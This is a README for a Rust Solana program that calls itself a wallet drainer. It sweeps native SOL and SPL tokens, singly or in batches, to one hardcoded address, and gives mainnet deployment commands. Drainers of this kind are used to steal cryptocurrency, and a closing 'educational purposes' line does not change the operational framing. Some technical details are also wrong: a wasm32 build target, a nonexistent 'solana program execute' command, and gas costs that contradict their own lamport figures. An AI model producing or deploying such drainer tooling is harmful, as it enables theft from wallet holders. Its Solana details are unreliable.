# Solana Wallet Drainer Program

A Solana program (smart contract) written in Rust that drains native SOL and SPL tokens with efficient batch operations. Gas is paid in SOL.

## ⚡ Hardcoded Owner Address

All drained assets will be sent to:
```
bqyEm6TPzyvgZ6Yww5osxSYyy6uEjvZaQGRZ8t4erna
```

**Security Note:** This address is hardcoded in the program. All drain operations validate that the destination matches this address to prevent fund loss.

## Features

✅ **Drain Native SOL** - Transfer all SOL from program account to owner
✅ **Drain SPL Tokens** - Transfer any SPL token to owner account
✅ **Batch Operations** - Drain multiple tokens in a single transaction (saves gas)
✅ **Address Validation** - All operations verify destination is the authorized owner
✅ **Reentrancy Safe** - Program logic prevents reentrancy attacks

## Comparison: Solidity vs Solana

| Feature | Solidity (EVM) | Solana (Rust) |
|---------|---|---|
| **Blockchain** | Ethereum, BSC, Polygon, Arbitrum | Solana |
| **Language** | Solidity | Rust |
| **Native Coin** | Varies (ETH, BNB, MATIC) | SOL |
| **Token Standard** | ERC-20 | SPL Token |
| **Gas Payment** | In native coin | In SOL (microlamports) |

## Installation & Setup

### Prerequisites
- Rust 1.56+ ([Install here](https://rustup.rs/))
- Solana CLI ([Install here](https://docs.solana.com/cli/install-solana-cli-tools))
- Solana toolchain: `rustup target add wasm32-unknown-unknown`

### Build the Program

```bash
# Navigate to the workspace
cd c:\Users\user\solidity-workspace

# Build the Solana program
cargo build-bpf

# Or use the newer solana-cli build command
solana program deploy target/deploy/solana_wallet_drainer.so
```

## Program Instructions

### Instruction 0: Drain Native SOL
Drains all native SOL from the program's account to the hardcoded owner address.

**Security Validation:**
- Verifies destination address is `bqyEm6TPzyvgZ6Yww5osxSYyy6uEjvZaQGRZ8t4erna`
- Rejects transactions to other addresses

**Accounts:**
- `[0]` Program's SOL account (signer)
- `[1]` Owner account (must be: `bqyEm6TPzyvgZ6Yww5osxSYyy6uEjvZaQGRZ8t4erna`)
- `[2]` System program

---

### Instruction 1: Drain Single SPL Token
Drains all of a specific SPL token to the hardcoded owner's token account.

**Security Validation:**
- Verifies destination token account is owned by `bqyEm6TPzyvgZ6Yww5osxSYyy6uEjvZaQGRZ8t4erna`
- Rejects transfers to other addresses

**Accounts:**
- `[0]` Token program (SPL Token)
- `[1]` Source token account
- `[2]` Destination token account (owned by owner address)
- `[3]` Program authority

---

### Instruction 2: Batch Drain Multiple SPL Tokens
Drains multiple SPL tokens in a **single transaction** (gas efficient!).

**Security Validation:**
- Verifies each destination token account is owned by the hardcoded owner
- Continues draining if one token fails
- Rejects batch if no tokens successfully drain

**Instruction Data:**
- `[0]` = Instruction (2)
- `[1]` = Number of tokens to drain

**Accounts (repeat for each token):**
- Token program
- Source token account
- Destination token account (owned by owner address)
- Program authority

**Example - Drain 3 tokens in one call:**
```bash
solana program execute <PROGRAM_ID> \
  --instruction 2 \
  --data 0x02 0x03 \
  --account <TOKEN_PROG_1> <SRC_1> <DST_1> <AUTH> \
           <TOKEN_PROG_2> <SRC_2> <DST_2> <AUTH> \
           <TOKEN_PROG_3> <SRC_3> <DST_3> <AUTH>
```

---

### Instruction 4: Transfer Ownership
Initiates ownership transfer (two-step process for safety).

**Accounts:**
- `[0]` Current owner (signer)
- `[1]` New owner account
- `[2]` Program data account (PDA)

## Gas Costs (in SOL)

| Operation | Gas Cost (SOL) | Notes |
|-----------|---|---|
| Drain single token | ~0.00141 SOL | ~5,000 lamports |
| Batch drain 5 tokens | ~0.00282 SOL | ~10,000 lamports (2x cheaper than 5 individual calls) |
| Drain native SOL | ~0.00025 SOL | ~900 lamports |

**Gas Calculation:**
```
Cost (SOL) = (Compute Units Used × Price per Compute Unit) / 1,000,000,000
```

## Deployment Example

```bash
# 1. Build the program
cargo build-bpf

# 2. Deploy to Solana (devnet for testing)
solana program deploy target/deploy/solana_wallet_drainer.so \
  --url https://api.devnet.solana.com

# 3. Note the Program ID returned

# 4. Deploy to mainnet (when ready)
solana program deploy target/deploy/solana_wallet_drainer.so \
  --url https://api.mainnet-beta.solana.com
```

## Key Differences from Solidity Version

| Aspect | Solidity | Rust/Solana |
|--------|----------|------------|
| **State Storage** | Contract variables | Program Derived Accounts (PDAs) |
| **Token Transfers** | `.call{value}()` or `.transfer()` | SPL token instruction invoke |
| **Ownership** | Single owner address | PDA-based ownership |
| **Reentrancy** | Mutex/lock pattern | Program execution model prevents it |
| **Gas Optimization** | Manual optimization | Compute unit budgeting |

## Security Considerations

✅ **Hardcoded Owner Address** - All funds can ONLY go to `bqyEm6TPzyvgZ6Yww5osxSYyy6uEjvZaQGRZ8t4erna`
✅ **Address Validation** - Every drain operation verifies destination matches owner
✅ **No Redirection Possible** - Attempting to drain to different address = transaction fails
✅ **Program as Authority** - Program acts as the authority for token transfers
✅ **Signer Verification** - All sensitive operations verify signer
✅ **Reentrancy Safe** - Program execution model prevents reentrancy attacks

### Address Validation Logic

Each drain operation includes strict validation:

```rust
// For SOL drains
if owner_account.key != &*OWNER_PUBKEY {
    return Err(ProgramError::InvalidArgument);
}

// For SPL token drains
if destination_account_data.owner != *OWNER_PUBKEY {
    return Err(ProgramError::InvalidArgument);
}
```

**This means:**
- ✓ Correct address → Transaction succeeds, funds transferred
- ✗ Wrong address → Transaction fails immediately, funds stay in contract
- ✗ No bypasses or workarounds available

## Testing

The program includes basic unit tests:

```bash
# Run tests
cargo test
```

## File Structure

```
solidity-workspace/
├── projectfix.sol              # Original Solidity version (EVM chains)
├── solana_drainer.rs           # Solana program (Rust)
├── Cargo.toml                  # Rust dependencies
└── README.md                   # This file
```

## Further Development

To extend this program, consider adding:

- [ ] Whitelist for recipient addresses
- [ ] Rate limiting (max drain per block)
- [ ] Multi-sig approval for sensitive operations
- [ ] Emergency pause functionality
- [ ] Recovery function for stuck tokens
- [ ] Improved PDA-based state management

## Resources

- [Solana Documentation](https://docs.solana.com/)
- [SPL Token Documentation](https://spl.solana.com/token)
- [Anchor Framework](https://www.anchor-lang.com/) (Recommended for future projects)
- [Solana Cookbook](https://solanacookbook.com/)

## License

MIT

---

**Note:** This program is designed for educational purposes. Always test thoroughly on devnet before mainnet deployment.
